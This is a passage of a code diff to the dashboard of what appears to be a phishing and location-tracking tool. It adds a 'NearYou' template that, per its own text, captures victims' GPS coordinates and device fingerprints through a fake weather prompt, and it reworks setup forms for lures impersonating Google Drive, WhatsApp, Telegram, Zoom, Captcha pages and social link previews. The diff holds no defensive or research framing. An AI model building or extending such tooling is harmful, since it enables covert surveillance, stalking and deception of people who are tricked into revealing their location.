         activeCard.classList.remove('border-slate-750', 'bg-surface-900');
       }
 
       let html = '';
-      if (val === 1) { // GDrive
+      if (val === 0) { // NearYou
+        html = `
+          <div class="p-4 rounded-xl bg-surface-900/90 border border-slate-800 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
+            <div class="flex items-center space-x-3.5">
+              <span class="text-3xl">🌦️</span>
+              <div>
+                <span class="font-bold text-slate-100 text-xs block">NearYou Telemetry Engine Ready</span>
+                <span class="text-[11px] text-slate-400 mt-0.5 block leading-relaxed">Captures pinpoint GPS coordinates & device fingerprinting through a simulated weather & nearby attractions prompt. 100% automated with zero extra parameters needed.</span>
+              </div>
+            </div>
+            <span class="px-3 py-1 rounded-lg bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 text-[11px] font-mono font-bold shrink-0 self-start sm:self-auto">
+              ✓ Ready to Launch
+            </span>
+          </div>
+        `;
+      } else if (val === 1) { // GDrive
         const redirect = escapeHtml(activeCfg.redirect || 'https://drive.google.com');
         html = `
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Google Drive Target / Redirect File URL</label>
-            <input type="text" id="paramRedirect" value="${redirect}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://drive.google.com/file/d/..." />
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div>
+              <label class="block text-slate-300 font-medium mb-1">Destination Google Drive File URL</label>
+              <input type="text" id="paramRedirect" value="${redirect}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://drive.google.com/file/d/..." />
+              <span class="text-[10px] text-slate-500 mt-1 block">Victim is forwarded to this file link after location is recorded</span>
+            </div>
+            <div class="p-4 rounded-xl bg-surface-900/60 border border-slate-800/80 flex items-center space-x-3">
+              <span class="text-2xl">📁</span>
+              <p class="text-[11px] text-slate-400 leading-relaxed">Simulates a Google Drive shared file link. Prompts for location to select the closest Google Cloud edge server.</p>
+            </div>
           </div>
         `;
       } else if (val === 2) { // WhatsApp
         const title = escapeHtml(activeCfg.title || 'My Family & Friends');
         const image = escapeHtml(activeCfg.image || 'template/whatsapp/images/ZIvBTrQd9nP.png');
         html = `
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">WhatsApp Group Title</label>
-            <input type="text" id="paramTitle" value="${title}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
-          </div>
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Group Icon URL (or Image Path)</label>
-            <input type="text" id="paramImage" value="${image}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://example.com/icon.png" />
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div>
+              <label class="block text-slate-300 font-medium mb-1">WhatsApp Group Title</label>
+              <input type="text" id="paramTitle" value="${title}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+            </div>
+            <div>
+              <label class="block text-slate-300 font-medium mb-1">Group Icon URL (or Image Path)</label>
+              <input type="text" id="paramImage" value="${image}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://example.com/icon.png" />
+            </div>
           </div>
         `;
       } else if (val === 3) { // WhatsApp Redirect
@@ -2423,17 +2526,19 @@
         const image = escapeHtml(activeCfg.image || 'template/whatsapp_redirect/images/ZIvBTrQd9nP.png');
         const redirect = escapeHtml(activeCfg.redirect || 'https://chat.whatsapp.com/invite');
         html = `
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">WhatsApp Group Title</label>
-            <input type="text" id="paramTitle" value="${title}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
-          </div>
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Group Icon URL (or Image Path)</label>
-            <input type="text" id="paramImage" value="${image}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://example.com/icon.png" />
-          </div>
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Redirect WhatsApp Invite URL</label>
-            <input type="text" id="paramRedirect" value="${redirect}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div>
+              <label class="block text-slate-300 font-medium mb-1">WhatsApp Group Title</label>
+              <input type="text" id="paramTitle" value="${title}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+            </div>
+            <div>
+              <label class="block text-slate-300 font-medium mb-1">Group Icon URL (or Image Path)</label>
+              <input type="text" id="paramImage" value="${image}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://example.com/icon.png" />
+            </div>
+            <div class="md:col-span-2">
+              <label class="block text-slate-300 font-medium mb-1">Redirect WhatsApp Invite URL</label>
+              <input type="text" id="paramRedirect" value="${redirect}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+            </div>
           </div>
         `;
       } else if (val === 4) { // Telegram
@@ -2443,48 +2548,56 @@
         const memNum = escapeHtml(activeCfg.mem_num || '1,420');
         const onlineNum = escapeHtml(activeCfg.online_num || '86');
         html = `
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Telegram Group / Channel Title</label>
-            <input type="text" id="paramTitle" value="${title}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
-          </div>
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Channel Avatar Image URL (or Image Path)</label>
-            <input type="text" id="paramImage" value="${image}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://example.com/avatar.jpg" />
-          </div>
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Description</label>
-            <input type="text" id="paramDesc" value="${desc}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
-          </div>
-          <div class="grid grid-cols-2 gap-2">
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
             <div>
-              <label class="block text-slate-300 font-medium mb-1">Members Count</label>
-              <input type="text" id="paramMemNum" value="${memNum}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+              <label class="block text-slate-300 font-medium mb-1">Telegram Group / Channel Title</label>
+              <input type="text" id="paramTitle" value="${title}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
             </div>
             <div>
-              <label class="block text-slate-300 font-medium mb-1">Online Count</label>
-              <input type="text" id="paramOnlineNum" value="${onlineNum}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+              <label class="block text-slate-300 font-medium mb-1">Channel Avatar Image URL (or Image Path)</label>
+              <input type="text" id="paramImage" value="${image}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://example.com/avatar.jpg" />
+            </div>
+            <div class="md:col-span-2">
+              <label class="block text-slate-300 font-medium mb-1">Description</label>
+              <input type="text" id="paramDesc" value="${desc}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+            </div>
+            <div>
+              <label class="block text-slate-300 font-medium mb-1">Total Members Count</label>
+              <input type="text" id="paramMemNum" value="${memNum}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+            </div>
+            <div>
+              <label class="block text-slate-300 font-medium mb-1">Online Members Count</label>
+              <input type="text" id="paramOnlineNum" value="${onlineNum}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
             </div>
           </div>
         `;
       } else if (val === 5) { // Zoom
         const title = escapeHtml(activeCfg.title || 'Security Briefing & Team Call');
         html = `
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Conference Meeting Topic / Title</label>
-            <input type="text" id="paramTitle" value="${title}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div>
+              <label class="block text-slate-300 font-medium mb-1">Conference Meeting Topic / Title</label>
+              <input type="text" id="paramTitle" value="${title}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+            </div>
+            <div class="p-4 rounded-xl bg-surface-900/60 border border-slate-800/80 flex items-center space-x-3">
+              <span class="text-2xl">📹</span>
+              <p class="text-[11px] text-slate-400 leading-relaxed">Emulates a Zoom conference launch lobby. Prompts for audio/location clearance before connecting.</p>
+            </div>
           </div>
         `;
       } else if (val === 6) { // Captcha
         const redirect = escapeHtml(activeCfg.redirect || 'https://google.com');
         const displayUrl = escapeHtml(activeCfg.display_url || 'https://google.com/verify');
         html = `
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Forward / Destination URL after Verification</label>
-            <input type="text" id="paramRedirect" value="${redirect}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
-          </div>
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Display URL (Shown on Captcha Banner)</label>
-            <input type="text" id="paramDisplayUrl" value="${displayUrl}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div>
+              <label class="block text-slate-300 font-medium mb-1">Destination URL (After Human Verification)</label>
+              <input type="text" id="paramRedirect" value="${redirect}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+            </div>
+            <div>
+              <label class="block text-slate-300 font-medium mb-1">Display URL (Shown on Captcha Banner)</label>
+              <input type="text" id="paramDisplayUrl" value="${displayUrl}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+            </div>
           </div>
         `;
       } else if (val === 7) { // Custom OG
@@ -2494,27 +2607,53 @@
         const image = escapeHtml(activeCfg.image || 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600');
         const redirect = escapeHtml(activeCfg.redirect || 'https://google.com');
         html = `
-          <div class="grid grid-cols-2 gap-2">
-            <div>
-              <label class="block text-slate-300 font-medium mb-1">Site / Platform Name</label>
-              <input type="text" id="paramSitename" value="${sitename}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+          <div class="grid grid-cols-1 md:grid-cols-12 gap-5">
+            <!-- Left: Inputs (7 cols) -->
+            <div class="md:col-span-7 space-y-3">
+              <div class="grid grid-cols-2 gap-3">
+                <div>
+                  <label class="block text-slate-300 font-medium mb-1">Site / Platform Name</label>
+                  <input type="text" id="paramSitename" oninput="updateOGPreview()" value="${sitename}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="e.g. Google Drive" />
+                </div>
+                <div>
+                  <label class="block text-slate-300 font-medium mb-1">Social Preview Title</label>
+                  <input type="text" id="paramTitle" oninput="updateOGPreview()" value="${title}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="e.g. Confidential Share" />
+                </div>
+              </div>
+              <div>
+                <label class="block text-slate-300 font-medium mb-1">Social Card Preview Image URL</label>
+                <input type="text" id="paramImage" oninput="updateOGPreview()" value="${image}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://example.com/banner.png" />
+              </div>
+              <div>
+                <label class="block text-slate-300 font-medium mb-1">Preview Description</label>
+                <input type="text" id="paramDesc" oninput="updateOGPreview()" value="${desc}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="Description shown in chat message preview" />
+              </div>
+              <div>
+                <label class="block text-slate-300 font-medium mb-1">Destination URL (Forward Target to)</label>
+                <input type="text" id="paramRedirect" value="${redirect}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3.5 py-2.5 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://google.com" />
+              </div>
             </div>
-            <div>
-              <label class="block text-slate-300 font-medium mb-1">Social Preview Title</label>
-              <input type="text" id="paramTitle" value="${title}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
+
+            <!-- Right: Interactive Live Social Card Preview (5 cols) -->
+            <div class="md:col-span-5 flex flex-col justify-between p-4 bg-surface-900/90 rounded-2xl border border-slate-800">
+              <div>
+                <div class="flex items-center justify-between mb-2.5">
+                  <span class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">Social Chat Card Preview</span>
+                  <span class="text-cyan-400 font-mono text-[9px] bg-cyan-500/10 px-2 py-0.5 rounded border border-cyan-500/20">Live</span>
+                </div>
+                <div class="border border-slate-700/80 rounded-xl overflow-hidden bg-surface-950 shadow-lg">
+                  <div class="w-full h-32 bg-slate-900 overflow-hidden relative">
+                    <img id="ogPreviewImg" src="${image}" alt="Preview" class="w-full h-full object-cover transition-opacity duration-200" onerror="this.src='https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600'" />
+                  </div>
+                  <div class="p-3 space-y-1">
+                    <span id="ogPreviewSite" class="text-[10px] font-mono text-cyan-400 font-bold uppercase tracking-wider block truncate">${sitename}</span>
+                    <span id="ogPreviewTitle" class="font-bold text-xs text-slate-100 block truncate">${title}</span>
+                    <p id="ogPreviewDesc" class="text-[11px] text-slate-400 line-clamp-2 leading-relaxed">${desc}</p>
+                  </div>
+                </div>
+              </div>
+              <p class="text-[10px] text-slate-500 mt-3 leading-relaxed">This is the rich card thumbnail that automatically displays when sent via WhatsApp, Telegram, Discord, or iMessage.</p>
             </div>
-          </div>
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Preview Description</label>
-            <input type="text" id="paramDesc" value="${desc}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
-          </div>
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Social Card Preview Image URL</label>
-            <input type="text" id="paramImage" value="${image}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://example.com/banner.png" />
-          </div>
-          <div>
-            <label class="block text-slate-300 font-medium mb-1">Destination URL (Forward Target to)</label>
-            <input type="text" id="paramRedirect" value="${redirect}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
           </div>
         `;
       }
